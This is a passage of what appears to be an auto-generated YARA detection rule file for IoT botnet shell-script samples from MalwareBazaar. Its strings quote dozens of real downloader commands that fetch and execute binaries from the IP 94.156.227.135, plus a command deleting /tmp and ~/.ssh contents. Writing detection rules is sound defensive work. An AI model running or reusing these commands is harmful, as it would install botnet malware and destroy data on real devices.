      $s7 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s8 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s9 = "(wget http://94.156.227.135/vv/superh-O- || busybox wget http://94.156.227.135/vv/superh -O-) > .f; chmod 777 .f; ./.f rooster; " ascii
      $s10 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s11 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s12 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f rooster; > ." ascii
      $s13 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s14 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f rooste" ascii
      $s15 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f rooster; > ." ascii
      $s16 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s17 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s18 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s19 = "(wget http://94.156.227.135/vv/i686 -O- || busybox wget http://94.156.227.135/vv/i686 -O-) > .f; chmod 777 .f; ./.f ssh; > .f; #" ascii
      $s20 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f rooste" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule ac5a11026f814874b9b3aa699833ab0c7874f21044f8829ee07eeb703bf31b10 {
   meta:
      description = "evidences - file ac5a11026f814874b9b3aa699833ab0c7874f21044f8829ee07eeb703bf31b10.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "ac5a11026f814874b9b3aa699833ab0c7874f21044f8829ee07eeb703bf31b10"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s2 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s3 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s4 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s5 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s6 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s7 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s8 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s9 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s10 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s11 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s12 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s13 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s14 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s15 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f xvr; > .f; #" ascii
      $s16 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s17 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s18 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f xvr; >" ascii
      $s19 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s20 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule f29c3cd591c941f4fad481ed31917a701b873200bae178ce120905aff69762a6 {
   meta:
      description = "evidences - file f29c3cd591c941f4fad481ed31917a701b873200bae178ce120905aff69762a6.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "f29c3cd591c941f4fad481ed31917a701b873200bae178ce120905aff69762a6"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s2 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s3 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s4 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s5 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s6 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s7 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s8 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s9 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s10 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s11 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s12 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s13 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s14 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s15 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s16 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s17 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s18 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s19 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s20 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule f64ccf3af412a12c88084c555719f65008653ea1bc5e2e3050e7757581c341ac {
   meta:
      description = "evidences - file f64ccf3af412a12c88084c555719f65008653ea1bc5e2e3050e7757581c341ac.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "f64ccf3af412a12c88084c555719f65008653ea1bc5e2e3050e7757581c341ac"
   strings:
      $s1 = "(wget http://94.156.227.135/ee/armv4l -O- || busybox wget http://94.156.227.135/ee/armv4l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s2 = "(wget http://94.156.227.135/ee/mipsel -O- || busybox wget http://94.156.227.135/ee/mipsel -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s3 = "(wget http://94.156.227.135/ee/armv6l -O- || busybox wget http://94.156.227.135/ee/armv6l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s4 = "(wget http://94.156.227.135/ee/powerpc -O- || busybox wget http://94.156.227.135/ee/powerpc -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s5 = "(wget http://94.156.227.135/ee/arc -O- || busybox wget http://94.156.227.135/ee/arc -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s6 = "(wget http://94.156.227.135/ee/mips -O- || busybox wget http://94.156.227.135/ee/mips -O-) > .f; chmod 777 .f; ./.f escan; > .f;" ascii
      $s7 = "(wget http://94.156.227.135/ee/sh4 -O- || busybox wget http://94.156.227.135/ee/sh4 -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s8 = "(wget http://94.156.227.135/ee/arc -O- || busybox wget http://94.156.227.135/ee/arc -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s9 = "(wget http://94.156.227.135/ee/sparc -O- || busybox wget http://94.156.227.135/ee/sparc -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s10 = "(wget http://94.156.227.135/ee/mipsel -O- || busybox wget http://94.156.227.135/ee/mipsel -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s11 = "(wget http://94.156.227.135/ee/armv7l -O- || busybox wget http://94.156.227.135/ee/armv7l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s12 = "(wget http://94.156.227.135/ee/armv4eb -O- || busybox wget http://94.156.227.135/ee/armv4eb -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s13 = "(wget http://94.156.227.135/ee/armv5l -O- || busybox wget http://94.156.227.135/ee/armv5l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s14 = "(wget http://94.156.227.135/ee/armv6l -O- || busybox wget http://94.156.227.135/ee/armv6l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s15 = "(wget http://94.156.227.135/ee/sparc -O- || busybox wget http://94.156.227.135/ee/sparc -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s16 = "(wget http://94.156.227.135/ee/riscv32 -O- || busybox wget http://94.156.227.135/ee/riscv32 -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s17 = "(wget http://94.156.227.135/ee/armv4eb -O- || busybox wget http://94.156.227.135/ee/armv4eb -O-) > .f; chmod 777 .f; ./.f escan;" ascii
      $s18 = "(wget http://94.156.227.135/ee/sh4 -O- || busybox wget http://94.156.227.135/ee/sh4 -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s19 = "(wget http://94.156.227.135/ee/armv5l -O- || busybox wget http://94.156.227.135/ee/armv5l -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s20 = "(wget http://94.156.227.135/ee/powerpc -O- || busybox wget http://94.156.227.135/ee/powerpc -O-) > .f; chmod 777 .f; ./.f escan;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule f8c2237e66078a6b3004fa1c07afcb0a9b3c632da49e894e5063de47449f652e {
   meta:
      description = "evidences - file f8c2237e66078a6b3004fa1c07afcb0a9b3c632da49e894e5063de47449f652e.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "f8c2237e66078a6b3004fa1c07afcb0a9b3c632da49e894e5063de47449f652e"
   strings:
      $s1 = "(wget http://94.156.227.135/tt/armv7l -O- || busybox wget http://94.156.227.135/tt/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s2 = "(wget http://94.156.227.135/tt/armv4l -O- || busybox wget http://94.156.227.135/tt/armv4l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s3 = "(wget http://94.156.227.135/tt/powerpc -O- || busybox wget http://94.156.227.135/tt/powerpc -O-) > .f; chmod 777 .f; ./.f sscan;" ascii
      $s4 = "(wget http://94.156.227.135/tt/armv7l -O- || busybox wget http://94.156.227.135/tt/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s5 = "(wget http://94.156.227.135/tt/riscv32 -O- || busybox wget http://94.156.227.135/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f sscan;" ascii
      $s6 = "(wget http://94.156.227.135/tt/mips -O- || busybox wget http://94.156.227.135/tt/mips -O-) > .f; chmod 777 .f; ./.f sscan; > .f;" ascii
      $s7 = "(wget http://94.156.227.135/tt/powerpc -O- || busybox wget http://94.156.227.135/tt/powerpc -O-) > .f; chmod 777 .f; ./.f sscan;" ascii
      $s8 = "(wget http://94.156.227.135/tt/armv4eb -O- || busybox wget http://94.156.227.135/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f sscan;" ascii
      $s9 = "(wget http://94.156.227.135/tt/riscv32 -O- || busybox wget http://94.156.227.135/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f sscan;" ascii
      $s10 = "(wget http://94.156.227.135/tt/armv6l -O- || busybox wget http://94.156.227.135/tt/armv6l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s11 = "(wget http://94.156.227.135/tt/sh4 -O- || busybox wget http://94.156.227.135/tt/sh4 -O-) > .f; chmod 777 .f; ./.f sscan; > .f; #" ascii
      $s12 = "(wget http://94.156.227.135/tt/sparc -O- || busybox wget http://94.156.227.135/tt/sparc -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s13 = "(wget http://94.156.227.135/tt/sparc -O- || busybox wget http://94.156.227.135/tt/sparc -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s14 = "(wget http://94.156.227.135/tt/armv4eb -O- || busybox wget http://94.156.227.135/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f sscan;" ascii
      $s15 = "(wget http://94.156.227.135/tt/armv6l -O- || busybox wget http://94.156.227.135/tt/armv6l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s16 = "(wget http://94.156.227.135/tt/mipsel -O- || busybox wget http://94.156.227.135/tt/mipsel -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s17 = "(wget http://94.156.227.135/tt/sh4 -O- || busybox wget http://94.156.227.135/tt/sh4 -O-) > .f; chmod 777 .f; ./.f sscan; > .f; #" ascii
      $s18 = "(wget http://94.156.227.135/tt/armv5l -O- || busybox wget http://94.156.227.135/tt/armv5l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s19 = "(wget http://94.156.227.135/tt/mipsel -O- || busybox wget http://94.156.227.135/tt/mipsel -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s20 = "(wget http://94.156.227.135/tt/mips -O- || busybox wget http://94.156.227.135/tt/mips -O-) > .f; chmod 777 .f; ./.f sscan; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule fb98fba85979aa8a2fc94866e47a8c0ff79a94f86f0c5e88a3f4d72ab2df9c23 {
   meta:
      description = "evidences - file fb98fba85979aa8a2fc94866e47a8c0ff79a94f86f0c5e88a3f4d72ab2df9c23.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "fb98fba85979aa8a2fc94866e47a8c0ff79a94f86f0c5e88a3f4d72ab2df9c23"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s2 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s3 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s4 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s5 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s6 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s7 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s8 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s9 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s10 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s11 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s12 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s13 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s14 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s15 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f bigfish; > ." ascii
      $s16 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s17 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s18 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s19 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f bigfis" ascii
      $s20 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_73e0e33fe8b95f30fb70d6dff19636966facb01b15bfd8dc267d065f49975d90 {
   meta:
      description = "evidences - file 73e0e33fe8b95f30fb70d6dff19636966facb01b15bfd8dc267d065f49975d90.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "73e0e33fe8b95f30fb70d6dff19636966facb01b15bfd8dc267d065f49975d90"
   strings:
      $s1 = "(wget http://94.156.227.135/ss/armv7l -O- || busybox wget http://94.156.227.135/ss/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s2 = "(wget http://94.156.227.135/ss/armv7l -O- || busybox wget http://94.156.227.135/ss/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s3 = "(wget http://94.156.227.135/ss/armv4l -O- || busybox wget http://94.156.227.135/ss/armv4l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s4 = "(wget http://94.156.227.135/ss/armv4l -O- || busybox wget http://94.156.227.135/ss/armv4l -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s5 = " .f; # ; rm -rf .f;" fullword ascii
      $s6 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      all of them
}

rule fcc45c93576fbf91b4b852edbd810a55d12e74a5b0faefec4e18d5c977f16eab {
   meta:
      description = "evidences - file fcc45c93576fbf91b4b852edbd810a55d12e74a5b0faefec4e18d5c977f16eab.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "fcc45c93576fbf91b4b852edbd810a55d12e74a5b0faefec4e18d5c977f16eab"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s2 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s3 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s4 = "(wget http://94.156.227.135/vv/armv6l -O- || busybox wget http://94.156.227.135/vv/armv6l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s5 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s6 = "(wget http://94.156.227.135/vv/sparc -O- || busybox wget http://94.156.227.135/vv/sparc -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s7 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f router; > .f" ascii
      $s8 = "(wget http://94.156.227.135/vv/arc -O- || busybox wget http://94.156.227.135/vv/arc -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s9 = "(wget http://94.156.227.135/vv/armv5l -O- || busybox wget http://94.156.227.135/vv/armv5l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s10 = "(wget http://94.156.227.135/vv/powerpc -O- || busybox wget http://94.156.227.135/vv/powerpc -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s11 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s12 = "(wget http://94.156.227.135/vv/riscv32 -O- || busybox wget http://94.156.227.135/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s13 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f router; > .f" ascii
      $s14 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s15 = "(wget http://94.156.227.135/vv/armv4eb -O- || busybox wget http://94.156.227.135/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f router" ascii
      $s16 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s17 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s18 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s19 = "(wget http://94.156.227.135/vv/sh4 -O- || busybox wget http://94.156.227.135/vv/sh4 -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s20 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f router; " ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a {
   meta:
      description = "evidences - file 5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "5c4d731d25b12283868762832d80d7ac787000f1d26369818ab10c630e8ebe0a"
   strings:
      $s1 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s2 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s3 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s4 = "(wget http://94.156.227.135/vv/mips -O- || busybox wget http://94.156.227.135/vv/mips -O-) > .f; chmod 777 .f; ./.f ruckus; > .f" ascii
      $s5 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s6 = "(wget http://94.156.227.135/vv/armv7l -O- || busybox wget http://94.156.227.135/vv/armv7l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s7 = "(wget http://94.156.227.135/vv/mipsel -O- || busybox wget http://94.156.227.135/vv/mipsel -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s8 = "(wget http://94.156.227.135/vv/armv4l -O- || busybox wget http://94.156.227.135/vv/armv4l -O-) > .f; chmod 777 .f; ./.f ruckus; " ascii
      $s9 = "rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/" ascii
      $s10 = "rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/.* /var/tmp/* /var/tmp/.* ~/.ssh/* || busybox rm -f /tmp/* /tmp/.* /dev/shm/* /dev/shm/" ascii
      $s11 = ".* /var/tmp/* /var/tmp/.* ~/.ssh/*;" fullword ascii
      $s12 = "> .f; # ; rm -rf .f;" fullword ascii
      $s13 = "; # ; rm -rf .f;" fullword ascii
      $s14 = "./the_rizzler" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      8 of them
}

rule sig_7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb {
   meta:
      description = "evidences - file 7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "7a5a265f928fe926f6c1d0e5a5afc495f72cf0717a08d31b46aba7b0d4925bdb"
   strings:
